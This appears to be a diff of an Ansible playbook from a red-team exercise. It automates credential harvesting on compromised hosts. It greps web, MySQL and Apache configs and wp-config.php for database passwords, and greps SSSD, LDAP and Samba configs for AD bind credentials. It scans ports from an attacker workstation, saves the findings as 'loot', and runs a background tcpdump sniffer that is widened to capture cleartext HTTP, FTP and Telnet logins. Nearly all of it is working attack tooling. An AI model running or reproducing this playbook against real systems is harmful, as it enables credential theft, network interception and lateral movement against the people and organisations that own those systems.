@@ -3,35 +3,28 @@
 - name: Extract Database and Web Credentials
   become: yes
   shell: |
-    # Global search for assignments and PHP defines. Includes filenames.
-    (grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null; \
-     grep -rEo "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null) \
-    | grep -vE "(\.png|\.jpg|\.svg|\.gif)" \
-    | sort -u
+    # Keeping the high-volume search but cleaning the PHP constants a bit
+    grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null | grep -vE "(\.png|\.jpg|\.svg|\.gif)" || true
+    grep -rE "DB_(PASSWORD|USER|HOST|NAME)" /var/www/html/wp-config.php 2>/dev/null || true
   register: db_results
-  failed_when: false
   changed_when: false
 
-# SECTION 2: SYSTEM PORT SCAN
-- name: Scan for Open Service Ports
-  become: yes
+# SECTION 2: SYSTEM PORT SCAN (Fixed Logic)
+- name: Scan Target Ports from Red Workstation
+  delegate_to: localhost
   shell: |
-    # Fast scan of top ports. Requires nmap on Red Workstation.
-    nmap -sT -T4 --open {{ inventory_hostname }} | grep "tcp open"
+    # Scanning the target IP FROM your workstation
+    nmap -sT -T4 --open {{ ansible_host }} | grep "tcp open"
   register: port_scan_results
-  failed_when: false
-  changed_when: false
+  become: no
 
 # SECTION 3: AD/LDAP BIND INFO
 - name: Extract AD and LDAP Bind Info
   become: yes
   shell: |
-    # Search everything for AD/LDAP strings to pivot to SCP-DC-01.
-    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)[:=]\s*[^ \t\n;]+" /etc /var/www /opt 2>/dev/null \
-    | sort -u
+    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)" /etc/sssd /etc/ldap /etc/samba 2>/dev/null | sort -u
   register: ad_bind_results
   failed_when: false
-  changed_when: false
 
 # SECTION 4: DELIVERY
 - name: Deliver Organized Service Loot
@@ -39,15 +32,14 @@
   copy:
     content: |
       === SERVICE HARVEST: {{ inventory_hostname }} ===
-
       [DATABASE & WEB AUTH]
-      {{ db_results.stdout if db_results.stdout != "" else "None found" }}
+      {{ db_results.stdout }}
 
       [OPEN PORTS]
-      {{ port_scan_results.stdout if port_scan_results.stdout != "" else "No open ports found" }}
+      {{ port_scan_results.stdout }}
 
-      [AD/LDAP BIND CONFIGS]
-      {{ ad_bind_results.stdout if ad_bind_results.stdout != "" else "None found" }}
+      [AD/LDAP BIND]
+      {{ ad_bind_results.stdout }}
     dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/service_creds.txt"
   become: no
 
@@ -62,11 +54,12 @@
       - "--- AD BIND INFO ---"
       - "{{ ad_bind_results.stdout_lines | default(['None']) }}"
 
-# SECTION 6: NETWORK SNIFFER
+# SECTION 6: NOISY NETWORK SNIFFER (Broad Intel)
 - name: Start Background Network Sniffer
   delegate_to: localhost
   run_once: true
   become: yes
   shell: |
-    # YAML Literal block prevents Jinja2 errors.
-    nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
+    # This now catches ANY traffic on Port 80, 21 (FTP), and 23 (Telnet)
+    # It will show you headers, hostnames, and potential cleartext logins
+    nohup tcpdump -i ens8 -A -nn -l 'port 80 or port 21 or port 23' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
